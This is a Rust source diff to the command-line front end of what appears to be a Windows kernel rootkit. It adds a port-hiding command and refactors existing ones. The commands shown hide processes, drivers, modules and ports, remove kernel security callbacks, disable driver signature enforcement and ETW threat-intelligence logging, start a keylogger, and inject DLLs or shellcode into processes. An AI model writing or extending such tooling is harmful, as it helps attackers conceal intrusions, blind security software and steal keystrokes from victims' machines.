@@ -1,6 +1,7 @@
 #![allow(non_camel_case_types)]
 
-use clap::{arg, Parser, Subcommand, ValueHint, ArgAction};
+use clap::{arg, ArgAction, Parser, Subcommand, ValueHint};
+use crate::utils::{validate_sys_extension, Callbacks, Options, PortType, Protocol};
 
 /// The main command-line interface struct.
 #[derive(Parser)]
@@ -24,22 +25,24 @@ pub enum Commands {
         #[command(subcommand)]
         sub_command: ProcessCommands,
     },
+    
     /// Operations related to threads.
     Thread {
         /// Subcommands for thread operations.
         #[command(subcommand)]
         sub_command: ThreadCommands,
     },
+
     /// Operations related to drivers.
     Driver {
         /// Hide the driver.
         #[arg(long)]
         hide: bool,
-        
+
         /// Unhide the driver
         #[arg(long)]
         unhide: bool,
-        
+
         /// Enumerate the drivers.
         #[arg(long, short)]
         list: bool,
@@ -56,17 +59,40 @@ pub enum Commands {
         sub_command: MisCommands,
     },
 
+    /// Operations related to Port.
+    Port {
+        /// Hide the port.
+        #[arg(long)]
+        hide: bool,
+
+        /// Unhide the port.
+        #[arg(long)]
+        unhide: bool,
+
+        /// Protocol (TCP, UDP).
+        #[arg(long, required = true)]
+        protocol: Protocol,
+
+        /// Type Port
+        #[arg(long, required = true)]
+        type_: PortType,
+        
+        /// Number port.
+        #[arg(short, required = true)]
+        port_number: u16
+    },
+
     /// Operations related to Registry.
     #[cfg(not(feature = "mapper"))]
     Registry {
         #[command(subcommand)]
-        sub_command: RegistryCommands
+        sub_command: RegistryCommands,
     },
 
     /// Operations related to Module.
     Module {
         #[command(subcommand)]
-        sub_command: ModuleCommands
+        sub_command: ModuleCommands,
     },
 
     /// Operations related to Callback.
@@ -74,7 +100,7 @@ pub enum Commands {
         /// Enumerate callback.
         #[arg(long, short)]
         list: bool,
-        
+
         /// Enumerate Removed callback.
         #[arg(long, short)]
         enumerate: bool,
@@ -82,7 +108,7 @@ pub enum Commands {
         /// Remove callback.
         #[arg(long)]
         remove: Option<usize>,
-        
+
         /// Select callback.
         #[arg(long, short, required = true)]
         callback: Callbacks,
@@ -106,15 +132,15 @@ pub enum RegistryCommands {
         /// name of the key to be protected
         #[arg(short, long, required = true)]
         key: String,
-        
+
         /// name of the value key to be protected
         #[arg(short, long)]
         name: Option<String>,
-        
+
         /// Add protection.
         #[arg(short, long)]
         add: bool,
-        
+
         /// Remove protection.
         #[arg(short, long)]
         remove: bool,
@@ -144,7 +170,6 @@ pub enum RegistryCommands {
 
 #[derive(Subcommand)]
 pub enum InjectionCommands {
-
     /// DLL Injection
     DLL {
         /// The process ID to injection.
@@ -157,7 +182,7 @@ pub enum InjectionCommands {
 
         /// Type shellcode
         #[arg(long, short, required = true)]
-        type_: Injection
+        type_: InjectionTypes,
     },
 
     /// Shellcode Injection
@@ -172,7 +197,7 @@ pub enum InjectionCommands {
 
         /// Type shellcode
         #[arg(long, short, required = true)]
-        type_: Injection
+        type_: InjectionTypes,
     },
 }
 
@@ -185,30 +210,34 @@ pub enum ProcessCommands {
         #[arg(short, long, required = true)]
         pid: u32,
     },
+
     /// Hide the process.
     Hide {
         /// The process ID to hide.
         #[arg(short, long, required = true)]
         pid: u32,
     },
+    
     /// Unhide the process.
     Unhide {
         /// The process ID to unhide.
         #[arg(short, long, required = true)]
         pid: u32,
     },
+
     /// Terminate the process.
     Terminate {
         /// The process ID to terminate.
         #[arg(short, long, required = true)]
         pid: u32,
     },
+
     /// Signature the process.
     Signature {
         /// The process ID to protect.
         #[arg(short, long, required = true)]
         pid: u32,
-        
+
         /// The protection type.
         #[arg(long, required = true)]
         pt: PS_PROTECTED_TYPE,
@@ -217,6 +246,7 @@ pub enum ProcessCommands {
         #[arg(long, required = true)]
         sg: PS_PROTECTED_SIGNER,
     },
+    
     /// Enable protection for the process.
     #[cfg(not(feature = "mapper"))]
     Protection {
@@ -227,7 +257,7 @@ pub enum ProcessCommands {
         /// Add protection.
         #[arg(short, long)]
         add: bool,
-        
+
         /// Remove protection.
         #[arg(short, long)]
         remove: bool,
@@ -240,7 +270,7 @@ pub enum ProcessCommands {
         // Types Enumerate
         #[arg(long, short, required = true)]
         type_: Options,
-    }
+    },
 }
 
 #[derive(Subcommand)]
@@ -250,7 +280,7 @@ pub enum MisCommands {
         /// Disable DSE.
         #[arg(long)]
         disable: bool,
-        
+
         /// Enable DSE.
         #[arg(long)]
         enable: bool,
@@ -261,7 +291,7 @@ pub enum MisCommands {
         /// Stop the keylogger.
         #[arg(long)]
         stop: bool,
-        
+
         /// Start the keylogger.
         #[arg(long)]
         start: bool,
@@ -272,11 +302,11 @@ pub enum MisCommands {
         /// Disable ETWTI.
         #[arg(long)]
         disable: bool,
-        
+
         /// Enable ETWTI.
         #[arg(long)]
         enable: bool,
-    }
+    },
 }
 
 /// Enum representing the subcommands for module operations.
@@ -286,19 +316,19 @@ pub enum ModuleCommands {
     Hide {
         /// The module to hide.
         #[arg(short, long, required = true)]
-        module: String,
+        name: String,
 
         /// The pid to module.
         #[arg(short, long, required = true)]
         pid: u32,
     },
-    
+
     /// Enumerate modules.
     Enumerate {
         /// The process ID for enumerate modules.
         #[arg(short, long, required = true)]
         pid: u32,
-    }
+    },
 }
 
 /// Enum representing the subcommands for thread operations.
@@ -337,7 +367,7 @@ pub enum ThreadCommands {
         // Types Enumerate
         #[arg(long, short, required = true)]
         type_: Options,
-    }
+    },
 }
 
 /// Enum representing the types of process protection.
@@ -352,7 +382,7 @@ pub enum PS_PROTECTED_TYPE {
 }
 
 #[derive(clap::ValueEnum, Clone, Debug, Copy)]
-pub enum Injection {
+pub enum InjectionTypes {
     /// Injection using Thread
     Thread = 0,
     /// Injection using APC
@@ -384,60 +414,3 @@ pub enum PS_PROTECTED_SIGNER {
     Max = 9,
 }
 
-/// Enum representing callbacks
-#[derive(clap::ValueEnum, Clone, Debug, Copy)]
-pub enum Callbacks {
-    /// Callback for PsSetCreateProcessNotifyRoutine.
-    Process,
-    /// Callback for PsSetCreateThreadNotifyRoutine.
-    Thread,
-    /// Callback for PsSetLoadImageNotifyRoutine.
-    LoadImage,
-    /// Callback for CmRegisterCallbackEx
-    Registry,
-    /// Callback for ObProcess
-    ObProcess,
-    /// Callback for ObThread
-    ObThread,
-}
-
-impl Callbacks {
-    pub fn to_shared(self) -> shared::vars::Callbacks {
-        match self {
-            Callbacks::Process => shared::vars::Callbacks::PsSetCreateProcessNotifyRoutine,
-            Callbacks::Thread => shared::vars::Callbacks::PsSetCreateThreadNotifyRoutine,
-            Callbacks::LoadImage => shared::vars::Callbacks::PsSetLoadImageNotifyRoutine,
-            Callbacks::Registry => shared::vars::Callbacks::CmRegisterCallbackEx,
-            Callbacks::ObProcess => shared::vars::Callbacks::ObProcess,
-            Callbacks::ObThread => shared::vars::Callbacks::ObThread,
-        }
-    }
-}
-
-/// Enum representing options enumeration
-#[derive(clap::ValueEnum, Clone, Debug, Copy)]
-pub enum Options {
-    /// List of hidden targets
-    Hide,
-    /// List of protected targets
-    #[cfg(not(feature = "mapper"))]
-    Protection
-}
-
-impl Options {
-    pub fn to_shared(self) -> shared::vars::Options {
-        match self {
-            Options::Hide => shared::vars::Options::Hide,
-            #[cfg(not(feature = "mapper"))]
-            Options::Protection => shared::vars::Options::Protection,
-        }
-    }
-}
-
-fn validate_sys_extension(val: &str) -> Result<String, String> {
-    if val.ends_with(".sys") {
-        Ok(val.to_string())
-    } else {
-        Err(String::from("The driver file must have a .sys extension"))
-    }
-}
